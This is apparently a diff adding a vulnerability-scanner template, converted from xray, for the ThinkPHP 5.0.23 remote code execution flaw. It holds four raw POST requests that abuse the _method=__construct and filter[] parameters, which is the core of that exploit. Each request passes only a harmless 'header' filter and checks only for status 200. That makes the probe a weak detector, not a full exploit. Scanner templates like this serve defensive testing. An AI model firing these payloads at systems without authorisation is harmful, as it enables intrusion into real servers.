@@ -1,0 +1,68 @@
+id: poc-yaml-thinkphp-5-0-23-index-php-method-rce
+
+info:
+  name: poc-yaml-thinkphp-5-0-23-index-php-method-rce
+  author: xray-converter
+  severity: critical
+  tags: xray-converted,rce
+  reference:
+    - https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
+    - https://y4er.com/posts/thinkphp5-rce/
+
+http:
+  - raw:
+      - |
+        POST /index.php?s=captcha HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _method=__construct&filter[]=header&method=GET&server[REQUEST_METHOD]={{rand_base(8)}}:{{rand_base(8)}}
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /index.php?s=captcha HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _method=__construct&filter[]=header&method=get&get[]={{rand_base(8)}}:{{rand_base(8)}}
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /index.php?s=index/index HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        s={{rand_base(8)}}:{{rand_base(8)}}&_method=__construct&method=&filter[]=header
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _method=__construct&filter[]=header&server[REQUEST_METHOD]={{rand_base(8)}}:{{rand_base(8)}}
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
